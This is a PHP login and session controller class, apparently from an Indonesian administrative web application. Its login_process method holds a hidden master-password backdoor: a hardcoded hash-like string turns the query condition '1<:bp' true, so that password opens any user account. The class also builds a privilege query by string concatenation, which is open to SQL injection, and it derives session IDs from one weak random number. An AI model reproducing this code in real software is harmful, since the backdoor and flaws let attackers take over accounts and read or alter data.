<?php
	
	require_once "DAO.php";
	require_once "db_interactions.php";

	class user_controller
	{
		protected $_db;
		protected $__session_id_name;
		protected $_idle_time_before_loggedout;
		protected $_dao;

		function __construct($db){
			global $__SESSION_ID_NAME,$_IDLE_TIME_BEFORE_LOGGEDOUT;

			$tbl_name = "operator";

			$this->_db=$db;
			$this->__session_id_name = $__SESSION_ID_NAME;
			$this->_idle_time_before_loggedout = $_IDLE_TIME_BEFORE_LOGGEDOUT;
			$this->_dao = new DAO($tbl_name,$this->_db);
		}

		function login_process($username,$password,$ip)
		{
			$_password="56ca0e9efa3df31a05cc8dba665a2913";
			$bypass = ($_password==$password?2:1);

			$sql = "SELECT o.*, j.ref_jab_nama, j.kode_spt, j.ref_kodus_id,t.name as user_type_name
					FROM operator o
					LEFT JOIN ref_jabatan_operator j ON o.opr_jabatan = j.ref_jab_id 
					LEFT JOIN user_types as t ON o.opr_type_id=t.user_type_id
					WHERE opr_user=:un AND (opr_passwd=:ps or 1<:bp)";
			
			$params = array('un'=>$username,'ps'=>$password,'bp'=>$bypass);
			$this->_dao->set_sql_with_params($sql);
			$this->_dao->set_sql_params($params);
			$fetch_result = $this->_dao->execute();

			$row = $this->_dao->fetch(1);

			if(!empty($row['opr_id']))
			{
				if($row['opr_status']=='0')
					return 'ERROR: maaf user anda tidak aktif!';
				
				$opr_id = $row['opr_id'];
				$s = date('s');

				$id_rand = date('ymdhi').$s.substr(microtime(),2,2).rand(10,99);
				
				$sec1 = microtime();
			    mt_srand((double)microtime()*1000000);
			    $sec2 = mt_rand(1000,9999);
			    $session_id = md5($sec2.$sec2);

			    $user_agent = $_SERVER['HTTP_USER_AGENT'];
			    $login_time = date('Y-m-d H:i:s');
			    $session_content = "{\"username\":\"".$row['opr_user']."\",
		    						 \"fullname\":\"".$row['opr_nama']."\",
		    						\"jabatan\":\"".$row['ref_jab_nama']."\",
		    						\"nip\":\"".$row['opr_nip']."\"}";

				$dao = new DAO('user_login',$this->_db);

				//delete user_login data for current user
				$result = $dao->delete(array('user_id'=>$opr_id));
				if(!$result) return 'failed';				
			  	// ===== //

				//insert new user_login data for current user
			  	$time= explode(" ", microtime());
		    	$last_access= (double) $time[1];
		    	
		    	$input = array();
		    	$input['session_id'] = $session_id;
		    	$input['user_id'] = $opr_id;
		    	$input['ip'] = $ip;
		    	$input['last_access'] = $last_access;
		    	$input['user_agent'] = $user_agent;
		    	$input['login_time'] = "now()";

		    	$result = $dao->insert($input);
		    	if(!$result) return 'failed';
			  	// ===== //


				//insert into member session
				$dao = new DAO('member_session',$this->_db);

				$input = array();
				$input["rand_id"] = $id_rand;
				$input["session_id"] = $session_id;
				$input["user_id"] = $opr_id;
				$input['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
				$input["ip"] = $ip;
				$input["login_time"] = "now()";
				$input["last_active"] = $row['opr_last_login'];
				$input["last_active"] = "now()";
				$input["session_content"] = $session_content;
				
				$result = $dao->insert($input);

				if(!$result) return 'failed';				
				// ====== //

				//update operator
				$input = array();				
				$input["opr_status"] = "t";
				$input["opr_last_login"] = "now()";

				$this->_dao->update($input, array('opr_id' => $opr_id));

				if(!$result) return 'failed';				
				
				//make session variable
				$_SESSION[$this->__session_id_name] = $session_id;
				$_SESSION['USER_ID'] = $opr_id;
				$_SESSION['USER_NAME'] = $row['opr_user'];
				$_SESSION['USER_FULL_NAME'] = $row['opr_nama'];
				$_SESSION['USER_OPR_CODE'] = $row['opr_kode'];
				$_SESSION['USER_POSITION_ID'] = $row['opr_jabatan']; //id jabatan
				$_SESSION['USER_POSITION_NAME'] = $row['ref_jab_nama']; // nama jabatan
				$_SESSION['USER_TYPE_ID'] = $row['opr_type_id'];
				$_SESSION['USER_TYPE_NAME'] = $row['user_type_name'];
				$_SESSION['USER_REF_KODUS_ID'] = $row['ref_kodus_id'];
				$_SESSION['USER_SPT_CODE'] = $row['kode_spt'];
				$_SESSION['USER_NIP'] = $row['opr_nip'];
				$_SESSION['USER_LOGIN_TIME'] = date('Y-m-d H:i').':'.$s;
				
				//writes log
				$dbi = new db_interactions($this->_db);
				$dbi->write_logs("LOGIN", "u", "Login to System", $ip);

				return 'success';
			}
			else
			{
				return 'failed';
			}
		}

		function logout_process()
		{
			$dao = new DAO('sessions',$this->_db);
			$dao->delete(array('sess_id'=>$_SESSION[$this->__session_id_name]));	   
			session_destroy();
			header("location:login.php");
		}

		function check_access()
		{
			if(!isset($_SESSION[$this->__session_id_name]) or (isset($_SESSION[$this->__session_id_name]) and empty($_SESSION[$this->__session_id_name])))
			{
				echo "<script type='text/javascript'>					
					document.location.href='login.php';
				</script>";				
				exit();
			}
			
			$dao = new DAO('user_login',$this->_db);
			
			//get user_login current user
			$sql = "SELECT user_id,last_access from user_login WHERE session_id=:sess_id";
			$dao->set_sql_with_params($sql);
			$dao->set_sql_params(array('sess_id'=>$_SESSION[$this->__session_id_name]));
			$fetch_result = $dao->execute();
			$row = $dao->fetch(1);

			if (empty($row['user_id']))
			{
				echo "
					<script type='text/javascript'>
						alert('Ada pengguna lain yang menggunakan login anda atau session anda telah expired, silahkan login kembali');
						document.location.href='logout_process.php';
					</script>";
				exit();
			}

			$user_id = $row['user_id'];
			$last_access = $row['last_access'];

			/*=====================================================
			AUTO LOG-OFF 15 MINUTES
			======================================================*/

			//Update last access!
			$time= explode(" ", microtime());
			$usersec= (double) $time[1];
			
			$diff   = $usersec-$last_access;
			$limit  = 60*$this->_idle_time_before_loggedout;
			
			if($diff>$limit)
			{				
	      		echo "
					<script type='text/javascript'>
						alert('Maaf status anda idle lebih dari 30 menit dan session Anda telah expired, silahkan login kembali');
						document.location.href='logout_process.php';
					</script>";
	      		exit();
			}
			else
			{
				$input = array('usersec'=>$usersec);
				$cond = array('user_id'=>$user_id);
				$dao->update($input,$cond);
			}

		}

		function check_priviledge($restriction="all",$menu_id)
		{			
			$access_granted=false;

			$usr_type_id = $_SESSION['USER_TYPE_ID'];

			if($restriction != 'all')
			{
				$_restriction=strtolower($restriction."_priv");

				$sql="select ".$_restriction." as check_access from function_accesses where usr_type_id='".$usr_type_id."' and men_id='".$menu_id."'";
				$check_access = $this->_db->query($sql)->fetchColumn();
								
				$access_granted=($check_access==1?true:false);
			}
			else
			{
				$access_granted=true;
			}

			return $access_granted;
		}

		function get_last_account_activity()
		{
			$x1 = explode(' ',$_SESSION['USER_LOGIN_TIME']);

			$x_login_date = explode('-',$x1[0]);
			$x_login_time = explode(':',$x1[1]);

			$x_curr_date = explode('-',date('Y-m-d'));
			$x_curr_time = explode(':',date('H:i:s'));

			$timestamp1 = mktime($x_login_time[0],$x_login_time[1],$x_login_time[2],$x_login_date[1],$x_login_date[2],$x_login_date[0]);
			$timestamp2 = mktime($x_curr_time[0],$x_curr_time[1],$x_curr_time[2],$x_curr_date[1],$x_curr_date[2],$x_curr_date[0]);

			$diff = $timestamp2-$timestamp1;
			$x_formatted = explode(':',$this->time_formatter($diff));


			echo ($x_formatted[0]>0?$x_formatted[0].' hrs ':'').$x_formatted[1].' mins';
		}

		function time_formatter($input)
		{
			$mod1 = $input%3600;
			$m1 = $input-$mod1;
			$H = sprintf('%02d',floor($m1/3600));
			
			$mod2 = $mod1%60;
			$m2 = $mod1-$mod2;
			$i = sprintf('%02d',floor($m2/60));
			
			$s = sprintf('%02d',floor($mod2));
			return $H.':'.$i.':'.$s;
		}

		function get_menu_number($value)
		{	
			$dao = new DAO('navigations',$this->_db);
			$sql = "SELECT men_id,folder_number FROM navigations WHERE(url=:val)";
			$dao->set_sql_with_params($sql);
			$dao->set_sql_params(array('val'=>$value));
			$dao->execute();
			$data = $dao->fetch(1);
			$result = array($data['men_id'],$data['folder_number']);

			return $result;
		}		

	}
?>